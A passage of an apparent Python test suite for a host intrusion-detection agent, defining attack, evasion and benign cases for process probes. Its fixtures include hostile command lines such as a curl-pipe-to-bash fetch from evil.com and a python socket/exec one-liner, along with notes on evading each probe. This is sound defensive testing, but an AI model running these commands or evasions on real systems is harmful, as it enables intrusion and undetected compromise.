        "The sustained threshold (60s) was not reached. Cleanup removes it "
        "from high_resource_pids — no event ever fires."
    ),
    why=(
        "is_high = 5.0 > 80.0 → False. PID 6000 not in current_high_pids → "
        "cleanup removes it. Even if CPU spikes again later, the clock resets. "
        "Brief-and-pause mining evades sustained-threshold detection."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    stateful=True,
    patch_targets=_pp(
        [_mk_proc(_p(pid=_MEM_PID, name="miner2", cpu_percent=5.0))],
        time_val=_T0 + 30.0,
    ),
)

_HICPU_DISTRIBUTED = AdversarialCase(
    id="hicpu_eva_distributed",
    title="10 mining processes at 15% each — per-process threshold evaded",
    category="evasion",
    description=(
        "Attacker spreads mining across 10 worker processes (PIDs 9000-9009) "
        "each using 15% CPU. System-wide load is 150% but each individual "
        "process is below the 80% per-process threshold."
    ),
    why=(
        "All processes: is_high = 15.0 > 80.0 → False. None tracked. "
        "Probe uses per-process thresholds, not system-wide CPU. "
        "Distributed mining is detected by OS-level monitoring, not this probe."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    stateful=False,
    patch_targets=_pp(
        [
            _mk_proc(_p(pid=9000 + i, name="worker", cpu_percent=15.0))
            for i in range(10)
        ],
        time_val=_T0,
    ),
)

_HICPU_COMPILER_SETUP = AdversarialCase(
    id="hicpu_benign_compiler_setup",
    title="C compiler at 85% CPU — first scan, tracking starts",
    category="benign",
    description=(
        "A large C++ build job (cc, PID 8000) legitimately pegs CPU at 85%. "
        "Probe starts tracking it at T0."
    ),
    why="high_resource_pids[8000] = T0. Not yet sustained → 0 events.",
    events=[],
    expect_count=0,
    stateful=True,
    patch_targets=_pp(
        [_mk_proc(_p(pid=_CC_PID, name="cc", cpu_percent=85.0))],
        time_val=_T0,
    ),
)

_HICPU_COMPILER_FIRE = AdversarialCase(
    id="hicpu_benign_compiler_fire",
    title="Compiler still at 85% at T0+65 — fires MEDIUM (FP: can't distinguish from miner)",
    category="benign",
    description=(
        "65 seconds into a long compile, the cc process is still at 85% CPU. "
        "The probe fires high_resource_process MEDIUM. This is a false positive: "
        "the probe cannot distinguish compilation from cryptomining."
    ),
    why=(
        "now - first_seen = 65 > 60 → fires MEDIUM. "
        "Design limitation: sustained CPU usage fires regardless of intent. "
        "Tuning the threshold higher reduces FPs but also reduces miner detection."
    ),
    events=[],
    expect_count=1,
    expect_event_types=["high_resource_process"],
    expect_severity=Severity.MEDIUM,
    stateful=True,
    patch_targets=_pp(
        [_mk_proc(_p(pid=_CC_PID, name="cc", cpu_percent=85.0))],
        time_val=_T0 + 65.0,
    ),
)

high_cpu_memory_scenario = register(
    Scenario(
        probe_id="high_cpu_memory",
        agent="proc",
        name="high_cpu_memory",
        title="High CPU/Memory Resource Abuse — T1496",
        description=(
            "Tests HighCPUAndMemoryProbe's sustained-threshold logic across 3 "
            "stateful chains. Shows that throttling below the 80% threshold, brief "
            "spikes that drop before 60s, and distributed multi-process mining all "
            "evade per-process sustained-threshold detection."
        ),
        mitre_techniques=["T1496"],
        mitre_tactics=["impact"],
        probe_factory=HighCPUAndMemoryProbe,
        cases=[
            _CPU_SETUP,
            _CPU_FIRE,
            _HICPU_EVA_THROTTLE,
            _HICPU_BRIEF_SETUP,
            _HICPU_BRIEF_DROP,
            _HICPU_DISTRIBUTED,
            _HICPU_COMPILER_SETUP,
            _HICPU_COMPILER_FIRE,
        ],
    )
)


# =============================================================================
# 5. LongLivedProcessProbe — masquerading as short-lived utilities (T1036)
# =============================================================================
#
# Fires MEDIUM when a process in EXPECTED_SHORT_LIVED has been running > 3600s.
# create_time is set in proc info; time.time() is mocked to return _T0.


def _ll_patches(name: str, create_time: float) -> dict:
    return _pp(
        [_mk_proc(_p(name=name, create_time=create_time))],
        time_val=_T0,
    )


_LL_POS1 = AdversarialCase(
    id="ll_pos1_grep_4h",
    title="grep running 4 hours — unexpectedly_long_process MEDIUM",
    category="positive",
    description=(
        "A C2 implant renamed 'grep' has been running for 4 hours. "
        "grep should complete in milliseconds — 4 hours is a strong masquerading signal."
    ),
    why=(
        "'grep' ∈ EXPECTED_SHORT_LIVED. runtime = T0 - (T0-14400) = 14400 > 3600 "
        "→ unexpectedly_long_process MEDIUM."
    ),
    events=[],
    expect_count=1,
    expect_event_types=["unexpectedly_long_process"],
    expect_severity=Severity.MEDIUM,
    patch_targets=_ll_patches("grep", _T0 - 14_400.0),
)

_LL_POS2 = AdversarialCase(
    id="ll_pos2_awk_2h",
    title="awk running 2 hours — unexpectedly_long_process MEDIUM",
    category="positive",
    description=(
        "Reverse shell renamed 'awk' has persisted for 2+ hours. "
        "awk is a text-processing utility; sustained execution is suspicious."
    ),
    why=("'awk' ∈ EXPECTED_SHORT_LIVED. runtime = 4500 > 3600 → fires MEDIUM."),
    events=[],
    expect_count=1,
    expect_event_types=["unexpectedly_long_process"],
    expect_severity=Severity.MEDIUM,
    patch_targets=_ll_patches("awk", _T0 - 4_500.0),
)

_LL_POS3 = AdversarialCase(
    id="ll_pos3_find_10k",
    title="find running 10000 seconds — fires MEDIUM",
    category="positive",
    description=(
        "An implant named 'find' has been running for nearly 3 hours. "
        "Extremely unusual for a file-search utility."
    ),
    why="'find' ∈ EXPECTED_SHORT_LIVED. runtime = 10000 > 3600 → fires MEDIUM.",
    events=[],
    expect_count=1,
    expect_event_types=["unexpectedly_long_process"],
    expect_severity=Severity.MEDIUM,
    patch_targets=_ll_patches("find", _T0 - 10_000.0),
)

_LL_EVA1 = AdversarialCase(
    id="ll_eva1_restart_45min",
    title="C2 restarts every 45 min — create_time shows only 45min elapsed",
    category="evasion",
    description=(
        "Attacker's C2, renamed 'grep', restarts itself every 45 minutes. "
        "At scan time the process create_time is only 45 minutes ago — under "
        "the 3600-second threshold."
    ),
    why=(
        "runtime = 2700 < 3600 → no event. "
        "Probe checks current runtime via create_time, not cumulative uptime. "
        "Periodic restart resets the clock and evades long-lived detection."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    patch_targets=_ll_patches("grep", _T0 - 2_700.0),
)

_LL_EVA2 = AdversarialCase(
    id="ll_eva2_kworker",
    title="C2 named 'kworker' — not in EXPECTED_SHORT_LIVED, 0 events",
    category="evasion",
    description=(
        "Attacker names their implant 'kworker' to blend with kernel worker "
        "threads. 'kworker' is not in EXPECTED_SHORT_LIVED so it never fires "
        "regardless of how long it runs."
    ),
    why=(
        "'kworker' ∉ EXPECTED_SHORT_LIVED. Probe only monitors a fixed list of "
        "short-lived utility names. Masquerading as a daemon name instead of a "
        "utility evades this probe entirely."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    patch_targets=_ll_patches("kworker", _T0 - 50_000.0),
)

_LL_EVA3 = AdversarialCase(
    id="ll_eva3_python3",
    title="C2 runs as python3 daemon — not in short-lived list, 0 events",
    category="evasion",
    description=(
        "Attacker deploys their implant as a long-running python3 'daemon'. "
        "'python3' is not in EXPECTED_SHORT_LIVED (it can legitimately run "
        "for hours as a server), so no alert fires."
    ),
    why=(
        "'python3' ∉ EXPECTED_SHORT_LIVED. Long-lived interpreters are common "
        "in production (Flask servers, Jupyter etc.) — adding them to the "
        "monitored set would cause excessive false positives."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    patch_targets=_ll_patches("python3", _T0 - 86_400.0),
)

_LL_BENIGN1 = AdversarialCase(
    id="ll_benign1_grep_30min",
    title="grep log search for 30 minutes — under threshold, 0 events",
    category="benign",
    description=(
        "An engineer runs a complex grep pipeline over a large log archive. "
        "It takes 30 minutes but completes under the 1-hour threshold."
    ),
    why="runtime = 1800 < 3600 → probe correctly returns 0 events.",
    events=[],
    expect_count=0,
    patch_targets=_ll_patches("grep", _T0 - 1_800.0),
)

_LL_BENIGN2 = AdversarialCase(
    id="ll_benign2_cat_40min",
    title="cat streaming logs for 40 minutes — under threshold, 0 events",
    category="benign",
    description=(
        "A monitoring script uses cat to stream a large file over 40 minutes. "
        "Under 60-minute threshold — probe correctly ignores it."
    ),
    why="runtime = 2400 < 3600 → 0 events (correct true negative).",
    events=[],
    expect_count=0,
    patch_targets=_ll_patches("cat", _T0 - 2_400.0),
)

long_lived_process_scenario = register(
    Scenario(
        probe_id="long_lived_process",
        agent="proc",
        name="long_lived_process",
        title="Long-Lived Process Masquerading — T1036",
        description=(
            "Tests LongLivedProcessProbe's EXPECTED_SHORT_LIVED list + 3600s "
            "threshold. Evasions: restart cycling (resets create_time), and using "
            "a name not in the monitored list (kworker, python3)."
        ),
        mitre_techniques=["T1036"],
        mitre_tactics=["persistence", "defense_evasion"],
        probe_factory=LongLivedProcessProbe,
        cases=[
            _LL_POS1,
            _LL_POS2,
            _LL_POS3,
            _LL_EVA1,
            _LL_EVA2,
            _LL_EVA3,
            _LL_BENIGN1,
            _LL_BENIGN2,
        ],
    )
)


# =============================================================================
# 6. SuspiciousUserProcessProbe — services running as wrong user (T1078)
# =============================================================================
#
# Fires HIGH when a process in ROOT_ONLY_PROCESSES runs as any user other than
# "root", "system", or "nt authority\\system".


def _susp_patches(name: str, username: str) -> dict:
    return _pp([_mk_proc(_p(name=name, username=username))])


_SUSP_POS1 = AdversarialCase(
    id="susp_pos1_sshd_attacker",
    title="sshd running as 'attacker' — process_wrong_user HIGH",
    category="positive",
    description=(
        "Attacker has compromised a service account and relaunched sshd "
        "under their own user context. sshd should ONLY run as root."
    ),
    why=(
        "'sshd' ∈ ROOT_ONLY_PROCESSES; username='attacker' ∉ {'root','system'} "
        "→ process_wrong_user HIGH."
    ),
    events=[],
    expect_count=1,
    expect_event_types=["process_wrong_user"],
    expect_severity=Severity.HIGH,
    patch_targets=_susp_patches("sshd", "attacker"),
)

_SUSP_POS2 = AdversarialCase(
    id="susp_pos2_nginx_ubuntu",
    title="nginx running as 'ubuntu' — process_wrong_user HIGH",
    category="positive",
    description=(
        "Attacker gained a shell as 'ubuntu' and started a malicious nginx "
        "process under that identity after exploiting the web application."
    ),
    why="'nginx' ∈ ROOT_ONLY_PROCESSES; 'ubuntu' ∉ allowed users → HIGH.",
    events=[],
    expect_count=1,
    expect_event_types=["process_wrong_user"],
    expect_severity=Severity.HIGH,
    patch_targets=_susp_patches("nginx", "ubuntu"),
)

_SUSP_POS3 = AdversarialCase(
    id="susp_pos3_dockerd_john",
    title="dockerd running as 'john' — process_wrong_user HIGH",
    category="positive",
    description=(
        "Developer 'john' has started their own dockerd instance, bypassing "
        "system controls. Could indicate privilege escalation via Docker socket."
    ),
    why="'dockerd' ∈ ROOT_ONLY_PROCESSES; 'john' ∉ allowed users → HIGH.",
    events=[],
    expect_count=1,
    expect_event_types=["process_wrong_user"],
    expect_severity=Severity.HIGH,
    patch_targets=_susp_patches("dockerd", "john"),
)

_SUSP_EVA1 = AdversarialCase(
    id="susp_eva1_root_masquerade",
    title="Attacker runs sshd as root — probe skips (root is expected)",
    category="evasion",
    description=(
        "Attacker has already escalated to root and launches a backdoored sshd "
        "as root. The probe sees root → expected username → no alert."
    ),
    why=(
        "username='root' ∈ {'root','system'} → condition fails → 0 events. "
        "Root-level attackers are invisible to this probe."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    patch_targets=_susp_patches("sshd", "root"),
)

_SUSP_EVA2 = AdversarialCase(
    id="susp_eva2_bash_not_monitored",
    title="C2 named 'bash' as root — not in ROOT_ONLY_PROCESSES, 0 events",
    category="evasion",
    description=(
        "Attacker runs their malware as 'bash' (not in ROOT_ONLY_PROCESSES). "
        "The probe only monitors a fixed set of service names."
    ),
    why=(
        "'bash' ∉ ROOT_ONLY_PROCESSES → probe skips it. "
        "Any process name outside the monitored set evades regardless of user."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    patch_targets=_susp_patches("bash", "root"),
)

_SUSP_EVA3 = AdversarialCase(
    id="susp_eva3_kworker",
    title="C2 named 'kworker' — not monitored, 0 events",
    category="evasion",
    description=(
        "Malware masquerading as a kernel worker thread is not in "
        "ROOT_ONLY_PROCESSES. Runs as any user without triggering the probe."
    ),
    why="'kworker' ∉ ROOT_ONLY_PROCESSES → 0 events.",
    events=[],
    expect_count=0,
    expect_evades=True,
    patch_targets=_susp_patches("kworker", "nobody"),
)

_SUSP_BENIGN1 = AdversarialCase(
    id="susp_benign1_nginx_service_account",
    title="nginx as 'nginx' service account — fires HIGH (FP_RISK)",
    category="benign",
    description=(
        "nginx is configured with privilege-drop to the dedicated 'nginx' "
        "service account (a security best practice). The probe fires HIGH "
        "because it does not recognise dedicated service accounts."
    ),
    why=(
        "username='nginx' ∉ {'root','system'} → fires HIGH. FP_RISK: "
        "ROOT_ONLY_PROCESSES has no per-service whitelist. Operators must "
        "suppress this alert for known-good service-account configurations."
    ),
    events=[],
    expect_count=1,
    expect_severity=Severity.HIGH,
    patch_targets=_susp_patches("nginx", "nginx"),
)

_SUSP_BENIGN2 = AdversarialCase(
    id="susp_benign2_postgres_service",
    title="postgres as 'postgres' service account — 0 events (correctly excluded)",
    category="benign",
    description=(
        "PostgreSQL uses a dedicated 'postgres' OS account as a security "
        "isolation boundary. postgres was removed from ROOT_ONLY_PROCESSES "
        "because it is designed to run as a non-root service account."
    ),
    why=(
        "'postgres' ∉ ROOT_ONLY_PROCESSES (removed: designed for privilege-drop) "
        "→ probe skips it → 0 events. This is the correct behavior."
    ),
    events=[],
    expect_count=0,
    patch_targets=_susp_patches("postgres", "postgres"),
)

suspicious_user_process_scenario = register(
    Scenario(
        probe_id="suspicious_user_process",
        agent="proc",
        name="suspicious_user_process",
        title="Suspicious User Process — T1078 (Valid Accounts)",
        description=(
            "Tests SuspiciousUserProcessProbe's ROOT_ONLY_PROCESSES list. "
            "Evasions: running as root (probe checks non-root only), using a process "
            "name not in the list. FP cases: legitimate service-account privilege-drop "
            "(nginx, postgres) fire HIGH despite being a security best practice."
        ),
        mitre_techniques=["T1078"],
        mitre_tactics=["privilege_escalation", "defense_evasion"],
        probe_factory=SuspiciousUserProcessProbe,
        cases=[
            _SUSP_POS1,
            _SUSP_POS2,
            _SUSP_POS3,
            _SUSP_EVA1,
            _SUSP_EVA2,
            _SUSP_EVA3,
            _SUSP_BENIGN1,
            _SUSP_BENIGN2,
        ],
    )
)


# =============================================================================
# 7. BinaryFromTempProbe — execution from temp directories (T1204)
# =============================================================================
#
# Fires HIGH when process exe path matches any TEMP_PATTERNS (regex).


def _bft_patches(exe_path: str, name: str = "evil") -> dict:
    return _pp([_mk_proc(_p(name=name, exe=exe_path))])


_BFT_POS1 = AdversarialCase(
    id="bft_pos1_tmp",
    title="/tmp/revshell — execution_from_temp HIGH",
    category="positive",
    description="Attacker drops and executes a reverse shell binary in /tmp.",
    why="exe matches r'/tmp/' → execution_from_temp HIGH.",
    events=[],
    expect_count=1,
    expect_event_types=["execution_from_temp"],
    expect_severity=Severity.HIGH,
    patch_targets=_bft_patches("/tmp/revshell"),
)

_BFT_POS2 = AdversarialCase(
    id="bft_pos2_macos_tmpdir",
    title="/private/var/folders/... macOS tmpdir — execution_from_temp HIGH",
    category="positive",
    description=(
        "Attacker exploits a macOS app and drops a payload into its temp sandbox "
        "under /private/var/folders (macOS per-user temp area)."
    ),
    why="exe matches r'/private/var/folders/' → execution_from_temp HIGH.",
    events=[],
    expect_count=1,
    expect_event_types=["execution_from_temp"],
    expect_severity=Severity.HIGH,
    patch_targets=_bft_patches("/private/var/folders/xx/abcdef/T/implant"),
)

_BFT_POS3 = AdversarialCase(
    id="bft_pos3_dev_shm",
    title="/dev/shm/shellcode — execution_from_temp HIGH (RAM-backed)",
    category="positive",
    description=(
        "Attacker places shellcode in /dev/shm (shared memory, RAM-backed). "
        "Fileless-style execution from an in-memory filesystem."
    ),
    why="exe matches r'/dev/shm/' → execution_from_temp HIGH.",
    events=[],
    expect_count=1,
    expect_event_types=["execution_from_temp"],
    expect_severity=Severity.HIGH,
    patch_targets=_bft_patches("/dev/shm/shellcode"),
)

_BFT_EVA1 = AdversarialCase(
    id="bft_eva1_usr_local",
    title="Binary copied to /usr/local/bin — not a temp path, 0 events",
    category="evasion",
    description=(
        "Attacker copies their binary to /usr/local/bin/update (a persistent "
        "installation path). Not in TEMP_PATTERNS → no detection."
    ),
    why="/usr/local/bin/ ∉ TEMP_PATTERNS → 0 events. Persisting to a standard "
    "bin directory evades temp-execution detection.",
    events=[],
    expect_count=0,
    expect_evades=True,
    patch_targets=_bft_patches("/usr/local/bin/update"),
)

_BFT_EVA2 = AdversarialCase(
    id="bft_eva2_script_in_tmp",
    title="python3 runs /tmp/evil.py — cmdline check catches script path",
    category="positive",
    description=(
        "Attacker drops a Python script in /tmp/evil.py and runs it with "
        "python3. The exe is /usr/bin/python3, but the cmdline contains "
        "/tmp/evil.py which the probe now checks."
    ),
    why=(
        "BinaryFromTempProbe checks both exe and cmdline[1:3]. "
        "cmdline[1]='/tmp/evil.py' matches r'/tmp/' → execution_from_temp HIGH. "
        "Script-from-temp evasion is closed."
    ),
    events=[],
    expect_count=1,
    expect_event_types=["execution_from_temp"],
    expect_severity=Severity.HIGH,
    patch_targets=_pp(
        [
            _mk_proc(
                _p(
                    name="python3",
                    exe="/usr/bin/python3",
                    cmdline=["python3", "/tmp/evil.py"],
                )
            )
        ]
    ),
)

_BFT_EVA3 = AdversarialCase(
    id="bft_eva3_var_run",
    title="/var/run/malware — not in TEMP_PATTERNS, 0 events",
    category="evasion",
    description=(
        "Attacker places their binary in /var/run/ (used for PID files and "
        "sockets). Not a temp path — probe doesn't fire."
    ),
    why="/var/run/ ∉ TEMP_PATTERNS (only /tmp/, /var/tmp/, /dev/shm/ etc.) → 0 events.",
    events=[],
    expect_count=0,
    expect_evades=True,
    patch_targets=_bft_patches("/var/run/malware"),
)

_BFT_BENIGN1 = AdversarialCase(
    id="bft_benign1_npm_jest",
    title="npm jest worker from /tmp — fires HIGH (FP: build tooling uses /tmp)",
    category="benign",
    description=(
        "npm's jest test runner spawns worker processes from /tmp/jest-worker-* "
        "directories. This is a common pattern for build tools that use temp "
        "directories for inter-process communication."
    ),
    why=(
        "exe='/tmp/jest-worker-12345/worker.js' matches r'/tmp/' → HIGH. "
        "FP: build tools legitimately execute from /tmp. Operators should "
        "whitelist known build tool paths."
    ),
    events=[],
    expect_count=1,
    expect_severity=Severity.HIGH,
    patch_targets=_bft_patches("/tmp/jest-worker-12345/worker.js", name="node"),
)

_BFT_BENIGN2 = AdversarialCase(
    id="bft_benign2_macos_installer",
    title="macOS Installer helper from /private/var/folders — fires HIGH (FP)",
    category="benign",
    description=(
        "macOS app installers and XPC services routinely use "
        "/private/var/folders/ as a temp workspace during setup. "
        "The probe cannot distinguish this from attacker temp execution."
    ),
    why=(
        "exe matches r'/private/var/folders/' → HIGH. "
        "Known FP: macOS temp sandboxes trigger BinaryFromTempProbe. "
        "Consider whitelisting signed executables from this path."
    ),
    events=[],
    expect_count=1,
    expect_severity=Severity.HIGH,
    patch_targets=_bft_patches(
        "/private/var/folders/xx/abcdef/T/com.apple.installer.helper",
        name="installer",
    ),
)

binary_from_temp_scenario = register(
    Scenario(
        probe_id="binary_from_temp",
        agent="proc",
        name="binary_from_temp",
        title="Binary Execution from Temp Directory — T1204",
        description=(
            "Tests BinaryFromTempProbe's TEMP_PATTERNS regex matching on exe paths. "
            "Key evasions: installing to a permanent path (/usr/local/bin), using an "
            "interpreter to run a script (exe is the interpreter, not the script), "
            "and using /var/run/ (not in the pattern list)."
        ),
        mitre_techniques=["T1204", "T1059"],
        mitre_tactics=["execution"],
        probe_factory=BinaryFromTempProbe,
        cases=[
            _BFT_POS1,
            _BFT_POS2,
            _BFT_POS3,
            _BFT_EVA1,
            _BFT_EVA2,
            _BFT_EVA3,
            _BFT_BENIGN1,
            _BFT_BENIGN2,
        ],
    )
)


# =============================================================================
# 8. ScriptInterpreterProbe — suspicious script execution patterns (T1059)
# =============================================================================
#
# Fires HIGH when an INTERPRETERS process has cmdline matching SUSPICIOUS_PATTERNS.
# Returns 0 events if the interpreter runs with benign arguments.


def _si_patches(name: str, cmdline: list) -> dict:
    return _pp([_mk_proc(_p(name=name, cmdline=cmdline))])


_SI_POS1 = AdversarialCase(
    id="si_pos1_python_socket",
    title="python3 -c 'import socket;exec(...)' — suspicious_script_execution HIGH",
    category="positive",
    description=(
        "Attacker runs a Python one-liner that imports the socket module and "
        "calls exec() to execute an in-memory reverse shell payload."
    ),
    why=(
        "python3 ∈ INTERPRETERS. cmdline_str matches "
        r"r'import\s+(socket|subprocess|os|urllib|requests)' and r'eval\s*\(' "
        "→ HIGH."
    ),
    events=[],
    expect_count=1,
    expect_event_types=["suspicious_script_execution"],
    expect_severity=Severity.HIGH,
    patch_targets=_si_patches(
        "python3",
        [
            "python3",
            "-c",
            "import socket; s=socket.socket(); exec(open('/tmp/sh').read())",
        ],
    ),
)

_SI_POS2 = AdversarialCase(
    id="si_pos2_bash_curl_pipe",
    title="bash 'curl | bash' — suspicious_script_execution HIGH",
    category="positive",
    description=(
        "Classic 'curl pipe to bash' pattern: downloads a script from an "
        "attacker-controlled server and pipes it directly to bash for execution."
    ),
    why=(
        "bash ∈ INTERPRETERS. cmdline_str matches r'curl.*\\|\\s*(bash|sh)' " "→ HIGH."
    ),
    events=[],
    expect_count=1,
    expect_event_types=["suspicious_script_execution"],
    expect_severity=Severity.HIGH,
    patch_targets=_si_patches(
        "bash",
        [
            "bash",
            "-c",
            "curl http://evil.com/stager.sh | bash",
        ],
    ),
)

_SI_POS3 = AdversarialCase(
    id="si_pos3_python_eval",
    title="python3 eval() dynamic execution — suspicious_script_execution HIGH",
    category="positive",
    description=(
        "Attacker uses python3 with eval() to dynamically execute a payload. "
        "Dynamic execution is a strong indicator of evasion."
    ),
    why=(
        "cmdline_str matches r'eval\\s*\\(' → HIGH. "
        "Inline eval/exec in interpreter cmdline is a hallmark of fileless attacks."
    ),
    events=[],
    expect_count=1,
    expect_event_types=["suspicious_script_execution"],
    expect_severity=Severity.HIGH,
    patch_targets=_si_patches(
        "python3",
        [
            "python3",
            "-c",
            "eval(compile(open('/tmp/p').read(),'f','exec'))",
        ],
    ),
)

_SI_EVA1 = AdversarialCase(
    id="si_eva1_custom_binary",
    title="Custom binary 'analyzer' — not in INTERPRETERS, 0 events",
    category="evasion",
    description=(
        "Attacker delivers a compiled binary named 'analyzer'. Since it is not "
        "in INTERPRETERS, ScriptInterpreterProbe never inspects it."
    ),
    why=(
        "'analyzer' ∉ INTERPRETERS → probe skips it entirely. "
        "Compiled binaries and custom binary names bypass script interpreter "
        "detection regardless of their behaviour."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    patch_targets=_si_patches(
        "analyzer",
        [
            "analyzer",
            "--connect",
            "evil.com:443",
        ],
    ),
)

_SI_EVA2 = AdversarialCase(
    id="si_eva2_obfuscated_payload",
    title="python3 XOR-encrypted payload — no pattern match, 0 events",
    category="evasion",
    description=(
        "Attacker uses python3 to execute an XOR-encrypted payload that doesn't "
        "contain any of the SUSPICIOUS_PATTERNS keywords in the cmdline."
    ),
    why=(
        "python3 ∈ INTERPRETERS but cmdline_str has no base64, eval, import, "
        "IEX, DownloadString, or curl patterns → matches=[] → 0 events. "
        "Custom encoding/obfuscation that avoids known patterns evades detection."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    patch_targets=_si_patches(
        "python3",
        [
            "python3",
            "decrypt_and_run.pyc",
        ],
    ),
)

_SI_EVA3 = AdversarialCase(
    id="si_eva3_split_commands",
    title="Malicious logic split across multiple bash processes — no single match",
    category="evasion",
    description=(
        "Attacker splits the curl-pipe-bash pattern across separate shells: "
        "process 1 downloads to /tmp/s; process 2 executes it. "
        "Neither process contains the full suspicious pattern."
    ),
    why=(
        "This test mocks process 2 (bash /tmp/s) — 'bash /tmp/s' doesn't match "
        "any SUSPICIOUS_PATTERNS. Probe inspects each process cmdline in "
        "isolation; split-stage attacks evade single-process pattern matching."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    patch_targets=_si_patches("bash", ["bash", "/tmp/s"]),
)

_SI_BENIGN1 = AdversarialCase(
    id="si_benign1_bash_build",
    title="bash legitimate build script — no suspicious patterns, 0 events",
    category="benign",
    description=(
        "CI/CD pipeline runs bash to execute a build script. "
        "No suspicious keywords in cmdline → probe correctly returns 0 events."
    ),
    why=(
        "bash ∈ INTERPRETERS but cmdline '/path/to/build.sh --release' "
        "matches no SUSPICIOUS_PATTERNS → 0 events (correct true negative)."
    ),
    events=[],
    expect_count=0,
    patch_targets=_si_patches(
        "bash",
        [
            "bash",
            "/usr/local/bin/build.sh",
            "--release",
        ],
    ),
)

_SI_BENIGN2 = AdversarialCase(
    id="si_benign2_osascript_notification",
    title="osascript display notification — no suspicious patterns, 0 events",
    category="benign",
    description=(
        "An app uses osascript to display a macOS user notification. "
        "Legitimate use — no eval/exec/download patterns in cmdline."
    ),
    why=(
        "osascript ∈ INTERPRETERS but cmdline has no matching SUSPICIOUS_PATTERNS "
        "→ 0 events. Legitimate AppleScript invocations are correctly ignored."
    ),
    events=[],
    expect_count=0,
    patch_targets=_si_patches(
        "osascript",
        [
            "osascript",
            "-e",
            'display notification "Build complete" with title "CI"',
        ],
    ),
)

script_interpreter_scenario = register(
    Scenario(
        probe_id="script_interpreter",
        agent="proc",
        name="script_interpreter",
        title="Suspicious Script Interpreter Execution — T1059",
        description=(
            "Tests ScriptInterpreterProbe's INTERPRETERS list + SUSPICIOUS_PATTERNS "
            "regex matching. Evasions: custom binary names outside the interpreter "
            "list, obfuscated payloads without pattern keywords, and split-stage "
            "execution across separate processes."
        ),
        mitre_techniques=["T1059", "T1059.001", "T1059.003", "T1059.004", "T1059.006"],
        mitre_tactics=["execution"],
        probe_factory=ScriptInterpreterProbe,
        cases=[
            _SI_POS1,
            _SI_POS2,
            _SI_POS3,
            _SI_EVA1,
            _SI_EVA2,
            _SI_EVA3,
            _SI_BENIGN1,
            _SI_BENIGN2,
        ],
    )
)


# =============================================================================
# 9. DylibInjectionProbe — DYLD_INSERT_LIBRARIES abuse (T1547/T1574)
# =============================================================================
#
# macOS-only. Parses ps output for DYLD_INSERT_LIBRARIES env var.
# Requires: PSUTIL_AVAILABLE=True, platform.system()="Darwin", subprocess.run mock.


def _dylib_patches(subprocess_mock, platform_os: str = "Darwin") -> dict:
    return {
        _PA: True,
        _PP: _proc_factory("bash"),
        _PF: lambda: platform_os,
        _SR: subprocess_mock,
    }


_DYLIB_POS1 = AdversarialCase(
    id="dylib_pos1_single",
    title="bash with DYLD_INSERT_LIBRARIES in env — dylib_injection_detected CRITICAL",
    category="positive",
    description=(
        "Attacker sets DYLD_INSERT_LIBRARIES=/private/tmp/hooks.dylib before "
        "launching bash. The injected dylib intercepts system calls for "
        "credential harvesting."
    ),
    why=(
        "ps output contains 'DYLD_INSERT_LIBRARIES' → probe extracts path and "
        "emits dylib_injection_detected CRITICAL."
    ),
    events=[],
    expect_count=1,
    expect_event_types=["dylib_injection_detected"],
    expect_severity=Severity.CRITICAL,
    patch_targets=_dylib_patches(_dylib_ps_one()),
)

_DYLIB_POS2 = AdversarialCase(
    id="dylib_pos2_two_processes",
    title="bash + python3 both with DYLD_INSERT_LIBRARIES — fires 2× CRITICAL",
    category="positive",
    description=(
        "Attacker injects their dylib into two processes simultaneously — "
        "bash for persistence and python3 for active C2."
    ),
    why=(
        "Both ps output lines contain DYLD_INSERT_LIBRARIES → 2 separate "
        "dylib_injection_detected CRITICAL events emitted."
    ),
    events=[],
    expect_count=2,
    expect_event_types=["dylib_injection_detected"],
    patch_targets=_dylib_patches(_dylib_ps_two()),
)

_DYLIB_POS3 = AdversarialCase(
    id="dylib_pos3_staged_payload",
    title="curl with staged payload dylib path — CRITICAL",
    category="positive",
    description=(
        "Attacker loads a staged implant dylib into curl to intercept all "
        "outbound connections and add a C2 communication channel."
    ),
    why=(
        "ps output: 'DYLD_INSERT_LIBRARIES=/var/folders/.../stage2.dylib' "
        "→ probe fires CRITICAL for PID 9999."
    ),
    events=[],
    expect_count=1,
    expect_event_types=["dylib_injection_detected"],
    expect_severity=Severity.CRITICAL,
    patch_targets=_dylib_patches(
        _dylib_ps_one(
            pid=9999,
            proc_name="curl",
            dylib="/var/folders/xx/a1b2c3/T/stage2.dylib",
        )
    ),
)

_DYLIB_EVA1 = AdversarialCase(
    id="dylib_eva1_linux",
    title="Linux platform — probe skips (darwin-only), 0 events",
    category="evasion",
    description=(
        "On Linux, DYLD_INSERT_LIBRARIES does not exist (that's LD_PRELOAD). "
        "DylibInjectionProbe checks platform.system() and exits immediately "
        "on non-Darwin systems."
    ),
    why=(
        "platform.system()='Linux' ≠ 'Darwin' → probe returns [] immediately. "
        "Designed for macOS: Linux preload injection (LD_PRELOAD) is not detected."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    patch_targets=_dylib_patches(_dylib_ps_one(), platform_os="Linux"),
)

_DYLIB_EVA2 = AdversarialCase(
    id="dylib_eva2_ps_error",
    title="ps command fails (no permission) — 0 events",
    category="evasion",
    description=(
        "The ps command returns a non-zero exit code (e.g., running without "
        "sufficient permissions to read process environments). Probe silently "
        "returns without firing."
    ),
    why=(
        "result.returncode != 0 → probe logs debug and returns []. "
        "Sandboxed or restricted environments where ps fails evade dylib detection."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    patch_targets=_dylib_patches(_ps_error()),
)

_DYLIB_EVA3 = AdversarialCase(
    id="dylib_eva3_lc_load_dylib",
    title="Dylib injected via LC_LOAD_DYLIB — invisible to ps env check",
    category="evasion",
    description=(
        "Attacker patches the target binary's Mach-O header to add an "
        "LC_LOAD_DYLIB command instead of using DYLD_INSERT_LIBRARIES. "
        "The injection is baked into the binary, invisible to ps environment."
    ),
    why=(
        "ps output shows no DYLD_INSERT_LIBRARIES → probe returns 0 events. "
        "DylibInjectionProbe only detects env-var injection; binary patching "
